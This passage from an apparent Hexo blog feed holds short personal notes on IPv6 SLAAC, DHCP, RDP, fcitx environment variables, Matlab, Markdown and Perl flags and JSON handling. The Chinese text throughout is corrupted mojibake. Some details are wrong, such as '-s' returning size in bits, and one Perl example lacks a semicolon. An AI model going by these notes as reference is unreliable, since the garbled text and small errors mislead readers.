    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://blog.csdn.net/weixin_40228200/article/details/118682784">å‚è€ƒ1</a></h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>SLAAC æ˜¯ Stateless Address Autoconfiguration çš„ç®€ç§°.</p><p>IPv6 çš„åŠ¨æ€åœ°å€é…ç½®ä¸»è¦ä¾èµ–ä¸¤ä¸ªåè®®, ä¸€ä¸ªæ˜¯ DHCPv6, å¦ä¸€ä¸ªæ˜¯ IPv6 Stateless Address Autoconfiguration.</p><p>å®é™…ä¸­, ç»å¸¸å°† DHCP Server é…ç½®åœ¨è·¯ç”±å™¨ä¸Š.</p><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><p>SLAAC åè®®ç”±è·¯ç”±å™¨æ¥é€šå‘Šé…ç½® IPv6 åœ°å€æ‰€éœ€è¦çš„ä¿¡æ¯.</p><ol><li>æ”¯æŒ IPv6 çš„ç½‘å¡å¯åŠ¨çš„æ—¶å€™ä¼šå‘é€ä¸€æ¡ RS (Router Solicitation) æ¶ˆæ¯, æº IP æ˜¯ç½‘å¡çš„ link-local åœ°å€, ç›®çš„ IP æ˜¯ <code>ff02::2</code>. <code>ff02::2</code> æ˜¯ä¿ç•™ç»„æ’­åœ°å€, ç”¨æ¥è¡¨ç¤ºæ‰€æœ‰çš„è·¯ç”±å™¨.</li><li>è·¯ç”±å™¨æ”¶åˆ° RS æ¶ˆæ¯å, å›ä¼ ä¸€æ¡ RA (Router Advertisement), ä¸€èˆ¬æƒ…å†µä¸‹, RA çš„æº IP åœ°å€æ˜¯ Router çš„ link-local åœ°å€, ç›®çš„åœ°å€æ˜¯ <code>ff02::1</code>. <code>ff02::1</code> ä¹Ÿæ˜¯ä¿ç•™çš„ç»„æ’­åœ°å€, ç”¨æ¥è¡¨ç¤ºæ‰€æœ‰ä¸»æœº.</li></ol>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨-cpan-ä¸‹è½½æ¨¡å—å‡ºé”™</title>
    <link href="/2022/10/30/%E4%BD%BF%E7%94%A8-cpan-%E4%B8%8B%E8%BD%BD%E6%A8%A1%E5%9D%97%E5%87%BA%E9%94%99/"/>
    <url>/2022/10/30/%E4%BD%BF%E7%94%A8-cpan-%E4%B8%8B%E8%BD%BD%E6%A8%A1%E5%9D%97%E5%87%BA%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ <code>force install</code> æ¥ä¸‹è½½:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan<br>&gt; force install Module::Name<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DHCP-åˆ†é…-IPv4-åœ°å€çš„æµç¨‹</title>
    <link href="/2022/10/30/DHCP-%E5%88%86%E9%85%8D-IPv4-%E5%9C%B0%E5%9D%80%E7%9A%84%E6%B5%81%E7%A8%8B/"/>
    <url>/2022/10/30/DHCP-%E5%88%86%E9%85%8D-IPv4-%E5%9C%B0%E5%9D%80%E7%9A%84%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://blog.csdn.net/qq_62311779/article/details/122750972">å‚è€ƒ1</a></h1><p>DHCP ä½¿ç”¨ UDP åè®®ä¼ è¾“.</p><p>ä¸»æœºå‘é€è¯·æ±‚åˆ° DHCP æœåŠ¡å™¨çš„ 67 ç«¯å£, DHCP æœåŠ¡å™¨è¿”å›åº”ç­”åˆ°è¯·æ±‚ä¸»æœºçš„ 68 å·ç«¯å£.</p><p>DHCP Client ç”¨å¹¿æ’­å‘é€è¯·æ±‚. å…¶åŒ…å« DHCP Client çš„ MAC åœ°å€å’Œä¸»æœºå.</p><p>DHCP Server ä»å°šæœªåˆ†é…çš„ IP åœ°å€æ± ä¸­æŒ‘é€‰ä¸€ä¸ªåˆ†é…ç»™ DHCP å®¢æˆ·æœº.</p><h1 id="å‚è€ƒ2"><a href="#å‚è€ƒ2" class="headerlink" title="å‚è€ƒ2"></a><a href="https://blog.csdn.net/u012359618/article/details/51872678?ops_request_misc=&request_id=&biz_id=102&utm_term=DHCP&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-51872678.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187">å‚è€ƒ2</a></h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>DHCP æ˜¯ Dynamic Host Configuration Protocol çš„ç®€ç§°, æ˜¯ä¸€ä¸ªåº”ç”¨å±‚åè®®.</p><p>å½“æˆ‘ä»¬å°†å®¢æˆ·ä¸»æœº ip åœ°å€è®¾ç½®ä¸ºåŠ¨æ€è·å–æ–¹å¼æ—¶, DHCP æœåŠ¡å™¨å°±ä¼šæ ¹æ® DHCP åè®®ç»™å®¢æˆ·ç«¯åˆ†é… IP.</p><p>ç”¨ wireshark è¿‡æ»¤æ˜¯ç”¨ <code>BOOTP</code> æˆ– <code>DHCP</code>.</p><p>å››æ­¥:</p><ol><li>Client å‘é€ DHCP Discover åŒ…</li><li>DHCP Server æ¥æ”¶åˆ° DHCP Discover åŒ…åå‘é€ DHCP Offer åŒ…åº”ç­”</li><li>Client æ¥æ”¶åˆ° Offer åŒ…å, å‘é€ DHCP Request åŒ…è¯·æ±‚åˆ†é… IP </li><li>DHCP Server å‘é€ ACK æ•°æ®åŒ…ç¡®è®¤</li></ol><p><img src="/../img/DHCP_Client_interact_with_Server.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>test_ssh</title>
    <link href="/2022/10/29/test-ssh/"/>
    <url>/2022/10/29/test-ssh/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RDP-åè®®</title>
    <link href="/2022/10/29/RDP-%E5%8D%8F%E8%AE%AE/"/>
    <url>/2022/10/29/RDP-%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/songshiMVP1/article/details/46441929">å‚è€ƒ</a></p><p>RDP æ˜¯ Remote Desktop Protocol çš„ç®€ç§°.</p><p>ç”¨äº Windows. Linux ç«¯æœ‰å…¶ä»–çš„åˆ†æ”¯.</p><p>æ‰€æœ‰çš„è®¡ç®—éƒ½åœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œ, å®¢æˆ·ç«¯åªéœ€è¦å¤„ç†ç½‘ç»œè¿æ¥, æ¥å—æ•°æ®, ç•Œé¢æ˜¾ç¤ºå’Œè®¾å¤‡æ•°æ®è¾“å‡º.</p><p>RDP ä¼šå¯¹æ•°æ®è¿›è¡ŒåŠ å¯†.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OSI-å‚è€ƒæ¨¡å‹</title>
    <link href="/2022/10/29/OSI-%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/"/>
    <url>/2022/10/29/OSI-%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p><img src="/../img/OSI_module.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-fcitx-åœ¨ç»ˆç«¯ä¸‹åˆå‡ºç°é—®é¢˜</title>
    <link href="/2022/10/29/%E5%85%B3%E4%BA%8E-fcitx-%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%B8%8B%E5%8F%88%E5%87%BA%E7%8E%B0%E9%97%AE%E9%A2%98/"/>
    <url>/2022/10/29/%E5%85%B3%E4%BA%8E-fcitx-%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%B8%8B%E5%8F%88%E5%87%BA%E7%8E%B0%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>æœ‰çš„è¯´åœ¨ <code>.xprofile</code> ä¸‹æ·»åŠ ç¯å¢ƒå˜é‡, ä½†å¯¹æˆ‘å¹¶ä¸é€‚ç”¨, å…¶ä¸ºä½¿ç”¨ç™»å½•ç®¡ç†å™¨ (lightdm gdm ç­‰) æ—¶æ‰ä¼šè¯»å–çš„æ–‡ä»¶.</p><p>å°†ç¯å¢ƒå˜é‡æ·»åŠ åˆ° <code>~/.xinitrc</code> ä¸‹å³å¯.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> XMODIFIERS=<span class="hljs-string">&quot;@im=fcitx&quot;</span><br><span class="hljs-built_in">export</span> QT_IM_MODULE=fcitx<br><span class="hljs-built_in">export</span> GTK_IM_MODULE=fcitx<br></code></pre></td></tr></table></figure><p>å¬ç¾¤å‹è¯´, ä¼¼ä¹åœ¨æŸæ¬¡æ›´æ–°å, ä¸å†è¯»å– <code>~/.pam_environment</code> ä¸‹çš„ç¯å¢ƒ:</p><blockquote><p>pambase å‡çº§åä¸å†è¯»å–è®¾ç½®åœ¨ ~&#x2F;.pam_environment çš„ç¯å¢ƒå˜é‡<br>åœ¨ ~&#x2F;.pam_environment ä¸­è®¾ç½®æ¡Œé¢ç¯å¢ƒç”¨çš„ç¯å¢ƒå˜é‡çš„ç”¨æˆ·è¯·æ³¨æ„ï¼Œpambase &gt;&#x3D;20221020-1 ä¹‹åå–æ¶ˆäº† user_readenv&#x3D;1 å‚æ•°ï¼Œä¸å†è¯»å–è®¾ç½®åœ¨ ~&#x2F;.pam_environment ä¸­çš„ç¯å¢ƒå˜é‡ã€‚å¯ä»¥è€ƒè™‘åœ¨ &#x2F;etc&#x2F;environment è®¾ç½®ç³»ç»Ÿå…¨å±€çš„ç¯å¢ƒå˜é‡æˆ–è€…é‡‡ç”¨å…¶å®ƒæ–¹æ¡ˆã€‚<br>å¦è¯·æ³¨æ„ &#x2F;etc&#x2F;environment çš„è¯­æ³•æ ¼å¼å’Œ ~&#x2F;.pam_environment å¹¶ä¸ç›¸åŒï¼Œä¸èƒ½ç›´æ¥å¤åˆ¶æ–‡ä»¶å†…å®¹ã€‚ç»†èŠ‚è¯·å‚é˜… <a href="https://wiki.archlinux.org/title/Environment_variables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E4%BD%BF%E7%94%A8_pam_env">https://wiki.archlinux.org/title/Environment_variables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E4%BD%BF%E7%94%A8_pam_env</a><br>å…³äºå…¶ä½™è®¾ç½®ç¯å¢ƒå˜é‡çš„æ–¹æ¡ˆä¹Ÿå¯å‚è€ƒ <a href="https://wiki.archlinux.org/title/Environment_variables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/title/Environment_variables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a><br>fcitx5 ç›¸å…³çš„ç¯å¢ƒå˜é‡è¿˜å¯å‚è€ƒ <a href="https://wiki.archlinux.org/title/Fcitx5_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E9%9B%86%E6%88%90">https://wiki.archlinux.org/title/Fcitx5_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E9%9B%86%E6%88%90</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Matlab-æŠ€å·§ç§¯ç´¯</title>
    <link href="/2022/10/28/Matlab-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/"/>
    <url>/2022/10/28/Matlab-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="å°†å›¾åƒä¿å­˜ä¸º-PNG"><a href="#å°†å›¾åƒä¿å­˜ä¸º-PNG" class="headerlink" title="å°†å›¾åƒä¿å­˜ä¸º PNG"></a>å°†å›¾åƒä¿å­˜ä¸º PNG</h1><p><a href="https://ww2.mathworks.cn/help/matlab/ref/saveas.html?searchHighlight=saveas&s_tid=srchtitle_saveas_1">å‚è€ƒ</a></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">saveas(<span class="hljs-name">gcf</span>, &#x27;figure.png&#x27;, &#x27;png&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h1 id="æŒ‡æ•°æ‹Ÿåˆ"><a href="#æŒ‡æ•°æ‹Ÿåˆ" class="headerlink" title="æŒ‡æ•°æ‹Ÿåˆ"></a>æŒ‡æ•°æ‹Ÿåˆ</h1><p>ç”¨ <code>cftool</code> å‘½ä»¤.</p>]]></content>
    
    
    <categories>
      
      <category>Matlab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Matlab-æ·»åŠ æ•£ç‚¹</title>
    <link href="/2022/10/28/Matlab-%E6%B7%BB%E5%8A%A0%E6%95%A3%E7%82%B9/"/>
    <url>/2022/10/28/Matlab-%E6%B7%BB%E5%8A%A0%E6%95%A3%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ <code>scatter</code>, åªåœ¨å›¾ä¸­æ·»åŠ æ•£ç‚¹, å¹¶ä¸è¿æ¥.</p><p>åœ¨ <code>plot</code> ä¸­æ·»åŠ  <code>-o</code> å‚æ•°å³å¯.<br>å¦‚:</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs prolog">x = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>];<br>y = [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>];<br>plot(x, y, <span class="hljs-string">&#x27;-o&#x27;</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Matlab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Markdown-æŠ€å·§ç§¯ç´¯</title>
    <link href="/2022/10/27/Markdown-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/"/>
    <url>/2022/10/27/Markdown-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="åœ¨è¡¨æ ¼ä¸­æ¢è¡Œ"><a href="#åœ¨è¡¨æ ¼ä¸­æ¢è¡Œ" class="headerlink" title="åœ¨è¡¨æ ¼ä¸­æ¢è¡Œ"></a>åœ¨è¡¨æ ¼ä¸­æ¢è¡Œ</h1><p>ä½¿ç”¨ <code>&lt;br&gt;</code> (html ä¸­çš„æ ‡è®°).</p>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Perl-ä¸­-Benchmark-æ¨¡å—</title>
    <link href="/2022/10/27/%E5%85%B3%E4%BA%8E-Perl-%E4%B8%AD-Benchmark-%E6%A8%A1%E5%9D%97/"/>
    <url>/2022/10/27/%E5%85%B3%E4%BA%8E-Perl-%E4%B8%AD-Benchmark-%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<p>Benchmark æ˜¯ Benchmark running times of Perl code. ç”¨æ¥æµ‹é€Ÿ. å…·ä½“çœ‹:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perldoc Benchmark<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-æŠ€å·§ç§¯ç´¯</title>
    <link href="/2022/10/27/Perl-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/"/>
    <url>/2022/10/27/Perl-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="chdir-çš„é»˜è®¤å‚æ•°"><a href="#chdir-çš„é»˜è®¤å‚æ•°" class="headerlink" title="chdir çš„é»˜è®¤å‚æ•°"></a>chdir çš„é»˜è®¤å‚æ•°</h1><p><code>chdir</code> é»˜è®¤ä¸ºç”¨æˆ·çš„å®¶ç›®å½•.</p><h1 id="s-file"><a href="#s-file" class="headerlink" title="-s $file"></a>-s $file</h1><p>å…¶åœ¨æ ‡é‡ä¸Šä¸‹æ–‡ä¸­è¿”å›æ–‡ä»¶çš„å¤§å° (ç”¨å¤šå°‘æ¯”ç‰¹çš„å½¢å¼).</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $size = -s <span class="hljs-string">&quot;~/.zshrc&quot;</span>;<br><span class="hljs-keyword">print</span> $size;<br></code></pre></td></tr></table></figure><h1 id="åœ¨å‘½ä»¤è¡Œæ£€æŸ¥è¯­æ³•é”™è¯¯"><a href="#åœ¨å‘½ä»¤è¡Œæ£€æŸ¥è¯­æ³•é”™è¯¯" class="headerlink" title="åœ¨å‘½ä»¤è¡Œæ£€æŸ¥è¯­æ³•é”™è¯¯"></a>åœ¨å‘½ä»¤è¡Œæ£€æŸ¥è¯­æ³•é”™è¯¯</h1><p>ä½¿ç”¨ <code>perl -c</code>, <code>-c</code> æ˜¯ check.</p><h1 id="å½“å‰è¿è¡Œçš„-perl-æ–‡ä»¶"><a href="#å½“å‰è¿è¡Œçš„-perl-æ–‡ä»¶" class="headerlink" title="å½“å‰è¿è¡Œçš„ perl æ–‡ä»¶"></a>å½“å‰è¿è¡Œçš„ perl æ–‡ä»¶</h1><p>å…¶å€¼ä¿å­˜åœ¨ <code>$0</code> ä¸­.</p><h1 id="ä½¿ç”¨-perldoc-æŸ¥çœ‹-perl-å…³é”®è¯"><a href="#ä½¿ç”¨-perldoc-æŸ¥çœ‹-perl-å…³é”®è¯" class="headerlink" title="ä½¿ç”¨ perldoc æŸ¥çœ‹ perl å…³é”®è¯"></a>ä½¿ç”¨ perldoc æŸ¥çœ‹ perl å…³é”®è¯</h1><p>ä½¿ç”¨ <code>-f</code> å‚æ•°ï¼Œå¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perldoc -f our<br></code></pre></td></tr></table></figure><h1 id="ä½¿ç”¨-perl-çš„-I-å‚æ•°æ¥å¢åŠ -INC-å…ƒç´ "><a href="#ä½¿ç”¨-perl-çš„-I-å‚æ•°æ¥å¢åŠ -INC-å…ƒç´ " class="headerlink" title="ä½¿ç”¨ perl çš„ -I å‚æ•°æ¥å¢åŠ  @INC å…ƒç´ "></a>ä½¿ç”¨ perl çš„ <code>-I</code> å‚æ•°æ¥å¢åŠ  @INC å…ƒç´ </h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -Idirectory scripts<br></code></pre></td></tr></table></figure><h1 id="æ·»åŠ æ•£åˆ—è¡¨å…ƒç´ "><a href="#æ·»åŠ æ•£åˆ—è¡¨å…ƒç´ " class="headerlink" title="æ·»åŠ æ•£åˆ—è¡¨å…ƒç´ "></a>æ·»åŠ æ•£åˆ—è¡¨å…ƒç´ </h1><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$self-&gt;&#123;$_&#125; = <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> <span class="hljs-string">qw(wins places shows losses)</span>;<br></code></pre></td></tr></table></figure><h1 id="perl-0ne-çš„ç”¨æ³•"><a href="#perl-0ne-çš„ç”¨æ³•" class="headerlink" title="perl -0ne çš„ç”¨æ³•"></a>perl -0ne çš„ç”¨æ³•</h1><p><code>-0</code> æ˜¯æŒ‡å®š record separator, å³è®°å½•åˆ†éš”ç¬¦. ç”±äºé»˜è®¤çš„åˆ†éš”ç¬¦ä¸º <code>\0</code>, å³æ–‡ä»¶æœ«å°¾ï¼Œåˆ™åªä¼šåŒ¹é…ä¸€æ¬¡ã€‚</p><p>ä½¿ç”¨å…«è¿›åˆ¶æŒ‡å®š <code>\n</code>, å…¶å…«è¿›åˆ¶ ASCII ç ä¸º <code>012</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -012<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨åå…­è¿›åˆ¶æŒ‡å®š <code>\n</code>, å…¶åå…­è¿›åˆ¶ ASCII ç ä¸º <code>0x0A</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -0x0A<br></code></pre></td></tr></table></figure><p><code>-n</code> æ˜¯è‡ªåŠ¨ç»™ä»£ç åŠ ä¸Š <code>while (&lt;&gt;) &#123; ... &#125;</code> </p><p><code>-e</code> æ˜¯å†™ä»£ç .</p><p><code>-p</code> å‚æ•°ç›¸æ¯” <code>-n</code> ä¼šçœå»åŠ ä¸Š <code>print</code>.<br>æ ¼å¼ä¸º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>    ...             <span class="hljs-comment"># your program goes here</span><br>&#125; <span class="hljs-keyword">continue</span> &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;-p destination: $!\n&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>-i</code> å¯ä»¥ç›´æ¥ä¿®æ”¹æ–‡ä»¶. <code>-i.bak</code> è¡¨æ˜å¤‡ä»½æ–‡ä»¶çš„åç¼€. å…¶ä¼¼ä¹ä¼šæŠŠç¨‹åºå†…å¦‚ <code>print</code> çš„è¾“å‡ºé‡å®šå‘åˆ°å‘½ä»¤è¡Œå‚æ•°æŒ‡æ˜çš„æ–‡ä»¶. è¦ç›´æ¥ä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹å°±è¦ç”¨ <code>-i</code> å’Œ <code>-p</code></p><h1 id="JSON-module-of-perl"><a href="#JSON-module-of-perl" class="headerlink" title="JSON module of perl"></a>JSON module of perl</h1><p>å¯ä»¥ç”¨ <code>PERL_JSON_BACKEND</code> ç¯å¢ƒå˜é‡æ¥æŒ‡å®šç”¨å“ªä¸€ä¸ª JSON æ¨¡å—.</p><p>å°†å“ˆå¸Œè½¬æ¢ä¸º JSON æ•°æ®:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> JSON;<br><br><span class="hljs-keyword">my</span> $text = &#123;<br>    <span class="hljs-string">&quot;first&quot;</span> =&gt; <span class="hljs-string">&quot;Hello&quot;</span>,<br>    <span class="hljs-string">&quot;second&quot;</span> =&gt; <span class="hljs-string">&quot;World&quot;</span>,<br>    <span class="hljs-string">&quot;third&quot;</span> =&gt; <span class="hljs-string">&quot;HAAH&quot;</span>,<br>&#125;;<br><span class="hljs-keyword">my</span> $json_text = encode_json($text);<br><br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;$json_text&quot;</span>;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºä¸º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-string">&quot;Hello&quot;</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-string">&quot;World&quot;</span>,<span class="hljs-string">&quot;third&quot;</span>:<span class="hljs-string">&quot;HAAH&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºå¥½æ ¼å¼å¯ä»¥ä½¿ç”¨ <code>pretty</code> æˆå‘˜å‡½æ•°, å¯ä»¥ç”¨ <code>new</code> æˆå‘˜å‡½æ•°åˆ›å»ºä¸€ä¸ªå¯¹è±¡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> JSON;<br><br><span class="hljs-comment"># To json</span><br><span class="hljs-keyword">my</span> $text = &#123;<br>    <span class="hljs-string">&quot;first&quot;</span>  =&gt; <span class="hljs-string">&quot;Hello&quot;</span>,<br>    <span class="hljs-string">&quot;second&quot;</span> =&gt; <span class="hljs-string">&quot;World&quot;</span>,<br>    <span class="hljs-string">&quot;third&quot;</span>  =&gt; <span class="hljs-string">&quot;HAAH&quot;</span>,<br>&#125;;<br><span class="hljs-keyword">my</span> $json = JSON-&gt;new;<br><span class="hljs-keyword">my</span> $json_text = $json-&gt;pretty-&gt;encode($text);<br><br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;json_text&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p>å°† JSON æ ¼å¼æ•°æ®è½¬æ¢ä¸º Perl è¯­è¨€æ•°æ®:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> JSON;<br><br><span class="hljs-keyword">my</span> $text = &#123;<br>    <span class="hljs-string">&quot;first&quot;</span> =&gt; <span class="hljs-string">&quot;Hello&quot;</span>,<br>    <span class="hljs-string">&quot;second&quot;</span> =&gt; <span class="hljs-string">&quot;World&quot;</span>,<br>    <span class="hljs-string">&quot;third&quot;</span> =&gt; <span class="hljs-string">&quot;HAAH&quot;</span>,<br>&#125;;<br><span class="hljs-keyword">my</span> $json_text = encode_json($text);<br><span class="hljs-keyword">my</span> $perl_text = decode_json($json_text)<br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;$json_text&quot;</span>;<br></code></pre></td></tr></table></figure><p>çœ‹ä¸‹é¢çš„ä»£ç :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $filename = <span class="hljs-string">&quot;package.json&quot;</span>;<br><span class="hljs-keyword">my</span> $json = JSON-&gt;new;<br><span class="hljs-keyword">my</span> $json_text = <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&quot;&lt;:encoding(UTF-8)&quot;</span>, <span class="hljs-string">&quot;$filename&quot;</span>;<br>    <span class="hljs-keyword">local</span> $/;<br>    &lt;$fh&gt;<br>&#125;;<br><span class="hljs-keyword">my</span> $data = $json-&gt;decode($json_text);<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$data-&gt;&#123;$_&#125; \n&quot;</span> <span class="hljs-keyword">foreach</span> <span class="hljs-keyword">keys</span> %$data;<br></code></pre></td></tr></table></figure><p>è¿è¡Œåå‘ç°, json æ–‡ä»¶ä¸­ä¸€ä¸ªé”®å€¼å¯¹å¦‚:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;scripts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;build&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;hexo generate&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;clean&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;hexo clean&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;deploy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;hexo deploy&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;server&quot;</span><span class="hljs-punctuation">:</span> 